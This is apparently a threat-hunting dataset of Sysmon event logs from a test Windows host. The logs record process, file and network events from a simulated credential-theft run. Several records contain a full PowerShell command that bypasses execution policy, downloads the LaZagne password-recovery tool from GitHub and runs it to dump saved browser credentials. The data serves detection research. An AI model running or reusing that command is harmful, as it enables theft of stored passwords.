Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.1054032Z'/><EventRecordID>99895</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>DLL</Data><Data Name='UtcTime'>2024-12-12 21:59:59.104</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\_MEI35082\VCRUNTIME140.dll</Data><Data Name='CreationUtcTime'>2024-12-12 21:59:59.104</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:59.000-0500",created,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99895,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 21:59:59.104",,,"VCRUNTIME140.dll","C:\Users\inf808\AppData\Local\Temp\_MEI35082\VCRUNTIME140.dll",,WindowsTarget,,,99895,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}",,3508,,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe  browsers","-",WindowsTarget,,,,,"C:\Users\inf808\Desktop\","-",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:58.897</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe  browsers </Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=282DF7BCB720A5B6F409CAF9CCDA2F75,SHA256=3CC5EE93A9BA1FC57389705283B760C8BD61F35E9398BBFA3210E2BECF6D4B05,IMPHASH=7AA1951517B3B8D38B12F874B66196C9</Data><Data Name='ParentProcessGuid'>{8e02ef74-5cde-675b-5608-000000002a00}</Data><Data Name='ParentProcessId'>3552</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>""C:\Windows\system32\cmd.exe"" /c ""C:\Users\inf808\AppData\Local\inf808\LaZagne.exe browsers &gt; "" C:\Users\inf808\AppData\Local\inf808\T1555003LaZagne_output.txt</Data><Data Name='ParentUser'>WindowsTarget\inf808</Data>","Process creation",1,99894,,,"-",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=282DF7BCB720A5B6F409CAF9CCDA2F75,SHA256=3CC5EE93A9BA1FC57389705283B760C8BD61F35E9398BBFA3210E2BECF6D4B05,IMPHASH=7AA1951517B3B8D38B12F874B66196C9",,,7AA1951517B3B8D38B12F874B66196C9,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,High,,,,0x8000000000000000,4,,,"{8e02ef74-4233-675b-e1fd-1f0000000000}",0x1ffde1,,,,,,,,,282DF7BCB720A5B6F409CAF9CCDA2F75,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"-",,"""C:\Windows\system32\cmd.exe"" /c ""C:\Users\inf808\AppData\Local\inf808\LaZagne.exe browsers &gt; "" C:\Users\inf808\AppData\Local\inf808\T1555003LaZagne_output.txt","C:\Windows\System32\cmd.exe","{8e02ef74-5cde-675b-5608-000000002a00}",3552,"WindowsTarget\inf808",,,,,,,"{8e02ef74-5cde-675b-5708-000000002a00}","'3780'",3508,,,,"-",,,,,,99894,99894,,,,,"-",,3CC5EE93A9BA1FC57389705283B760C8BD61F35E9398BBFA3210E2BECF6D4B05,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:59.0108544Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.0108544Z'/><EventRecordID>99894</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,2,"'5104'","2024-12-12T21:59:59.0108544Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:58.897",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:59.0108544Z'/><EventRecordID>99894</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:58.897</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5708-000000002a00}</Data><Data Name='ProcessId'>3508</Data><Data Name='Image'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe</Data><Data Name='FileVersion'>-</Data><Data Name='Description'>-</Data><Data Name='Product'>-</Data><Data Name='Company'>-</Data><Data Name='OriginalFileName'>-</Data><Data Name='CommandLine'>C:\Users\inf808\AppData\Local\inf808\LaZagne.exe  browsers </Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=282DF7BCB720A5B6F409CAF9CCDA2F75,SHA256=3CC5EE93A9BA1FC57389705283B760C8BD61F35E9398BBFA3210E2BECF6D4B05,IMPHASH=7AA1951517B3B8D38B12F874B66196C9</Data><Data Name='ParentProcessGuid'>{8e02ef74-5cde-675b-5608-000000002a00}</Data><Data Name='ParentProcessId'>3552</Data><Data Name='ParentImage'>C:\Windows\System32\cmd.exe</Data><Data Name='ParentCommandLine'>""C:\Windows\system32\cmd.exe"" /c ""C:\Users\inf808\AppData\Local\inf808\LaZagne.exe browsers &gt; "" C:\Users\inf808\AppData\Local\inf808\T1555003LaZagne_output.txt</Data><Data Name='ParentUser'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:59.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99894,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99894,main,1,,,,,,,,,,,,,,"Microsoft Windows","""C:\Windows\system32\cmd.exe"" /c ""C:\Users\inf808\AppData\Local\inf808\LaZagne.exe browsers &gt; "" C:\Users\inf808\AppData\Local\inf808\T1555003LaZagne_output.txt","cmd.exe","{8e02ef74-5cde-675b-5608-000000002a00}",3552,"cmd.exe","C:\Windows\System32\cmd.exe",,,,"C:\Users\inf808\AppData\Local\inf808\LaZagne.exe  browsers","C:\Users\inf808\Desktop\","LaZagne.exe","{8e02ef74-5cde-675b-5708-000000002a00}","MD5=282DF7BCB720A5B6F409CAF9CCDA2F75,SHA256=3CC5EE93A9BA1FC57389705283B760C8BD61F35E9398BBFA3210E2BECF6D4B05,IMPHASH=7AA1951517B3B8D38B12F874B66196C9",3508,High,"LaZagne.exe","C:\Users\inf808\AppData\Local\inf808\LaZagne.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Windows\system32\cmd.exe"" /c ""C:\Users\inf808\AppData\Local\inf808\LaZagne.exe browsers &gt; "" C:\Users\inf808\AppData\Local\inf808\T1555003LaZagne_output.txt","Microsoft Corporation",WindowsTarget,,,,,"C:\Users\inf808\Desktop\","Windows Command Processor",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:58.884</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5608-000000002a00}</Data><Data Name='ProcessId'>3552</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.19041.4355 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>""C:\Windows\system32\cmd.exe"" /c ""C:\Users\inf808\AppData\Local\inf808\LaZagne.exe browsers &gt; "" C:\Users\inf808\AppData\Local\inf808\T1555003LaZagne_output.txt</Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ParentProcessId'>10624</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";Invoke-WebRequest \""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\"" -OutFile \""$StageDir\LaZagne.exe\"";cmd /c \""$StageDir\LaZagne.exe browsers &gt; \""$StageDir\T1555003LaZagne_output.txt\""\""""</Data><Data Name='ParentUser'>WindowsTarget\inf808</Data>","Process creation",1,99893,,,"10.0.19041.4355 (WinBuild.160101.0800)",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18",,,272245E2988E1E430500B852C4FB5E18,"C:\Windows\System32\cmd.exe",,,,High,,,,0x8000000000000000,4,,,"{8e02ef74-4233-675b-e1fd-1f0000000000}",0x1ffde1,,,,,,,,,2B40C98ED0F7A1D3B091A3E8353132DC,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"Cmd.Exe",,"powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";Invoke-WebRequest \""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\"" -OutFile \""$StageDir\LaZagne.exe\"";cmd /c \""$StageDir\LaZagne.exe browsers &gt; \""$StageDir\T1555003LaZagne_output.txt\""\""""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}",10624,"WindowsTarget\inf808",,,,,,,"{8e02ef74-5cde-675b-5608-000000002a00}","'3780'",3552,,,,"Microsoft® Windows® Operating System",,,,,,99893,99893,,,,,"-",,BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T21:59:58.8864707Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:58.8864707Z'/><EventRecordID>99893</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,2,"'5104'","2024-12-12T21:59:58.8864707Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:58.884",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:58.8864707Z'/><EventRecordID>99893</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:58.884</Data><Data Name='ProcessGuid'>{8e02ef74-5cde-675b-5608-000000002a00}</Data><Data Name='ProcessId'>3552</Data><Data Name='Image'>C:\Windows\System32\cmd.exe</Data><Data Name='FileVersion'>10.0.19041.4355 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows Command Processor</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>Cmd.Exe</Data><Data Name='CommandLine'>""C:\Windows\system32\cmd.exe"" /c ""C:\Users\inf808\AppData\Local\inf808\LaZagne.exe browsers &gt; "" C:\Users\inf808\AppData\Local\inf808\T1555003LaZagne_output.txt</Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18</Data><Data Name='ParentProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ParentProcessId'>10624</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";Invoke-WebRequest \""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\"" -OutFile \""$StageDir\LaZagne.exe\"";cmd /c \""$StageDir\LaZagne.exe browsers &gt; \""$StageDir\T1555003LaZagne_output.txt\""\""""</Data><Data Name='ParentUser'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T16:59:58.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99893,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99893,main,1,,,,,,,,,,,,,"Cmd.Exe","Microsoft Windows","powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";Invoke-WebRequest \""https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe\"" -OutFile \""$StageDir\LaZagne.exe\"";cmd /c \""$StageDir\LaZagne.exe browsers &gt; \""$StageDir\T1555003LaZagne_output.txt\""\""""","powershell.exe","{8e02ef74-5ccd-675b-5508-000000002a00}",10624,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,"""C:\Windows\system32\cmd.exe"" /c ""C:\Users\inf808\AppData\Local\inf808\LaZagne.exe browsers &gt; "" C:\Users\inf808\AppData\Local\inf808\T1555003LaZagne_output.txt","C:\Users\inf808\Desktop\","cmd.exe","{8e02ef74-5cde-675b-5608-000000002a00}","MD5=2B40C98ED0F7A1D3B091A3E8353132DC,SHA256=BADF4752413CB0CBDC03FB95820CA167F0CDC63B597CCDB5EF43111180E088B0,IMPHASH=272245E2988E1E430500B852C4FB5E18",3552,High,"cmd.exe","C:\Windows\System32\cmd.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,,,,,,"cdn-185-199-108-133.github.com","185.199.108.133",false,443,https,,,,,,"Microsoft-Windows-Sysmon/Operational",3,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.423</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.0.5</Data><Data Name='SourceHostname'>WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net</Data><Data Name='SourcePort'>54494</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>185.199.108.133</Data><Data Name='DestinationHostname'>cdn-185-199-108-133.github.com</Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data>","Network connection",3,99892,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,true,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5ccd-675b-5508-000000002a00}","'3780'",10624,,,,,,tcp,,,,99892,99892,,,,,"-",,,,,"S-1-5-18",,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",false,,54494,"-",,,,,,,,,,,,,,,"'2024-12-12T21:59:43.4559677Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:43.4559677Z'/><EventRecordID>99892</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='3880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,3,Printers,,"'3880'","2024-12-12T21:59:43.4559677Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 21:59:42.423",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T21:59:43.4559677Z'/><EventRecordID>99892</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='3880'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 21:59:42.423</Data><Data Name='ProcessGuid'>{8e02ef74-5ccd-675b-5508-000000002a00}</Data><Data Name='ProcessId'>10624</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='Protocol'>tcp</Data><Data Name='Initiated'>true</Data><Data Name='SourceIsIpv6'>false</Data><Data Name='SourceIp'>10.0.0.5</Data><Data Name='SourceHostname'>WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net</Data><Data Name='SourcePort'>54494</Data><Data Name='SourcePortName'>-</Data><Data Name='DestinationIsIpv6'>false</Data><Data Name='DestinationIp'>185.199.108.133</Data><Data Name='DestinationHostname'>cdn-185-199-108-133.github.com</Data><Data Name='DestinationPort'>443</Data><Data Name='DestinationPortName'>https</Data></EventData></Event>","2024-